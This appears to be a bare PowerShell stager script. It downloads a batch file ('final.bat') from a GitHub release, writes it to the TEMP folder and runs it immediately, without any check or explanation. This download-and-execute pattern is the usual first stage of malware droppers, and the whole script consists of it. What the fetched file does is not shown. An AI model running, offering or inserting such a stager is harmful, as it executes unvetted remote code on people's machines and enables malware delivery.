[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$url = "https://github.com/mirapuedovolar2/ps1prueba/releases/download/hola3/final.bat"
$destino = "$env:TEMP\final.bat"

Invoke-WebRequest -Uri $url -OutFile $destino
Start-Process -FilePath $destino
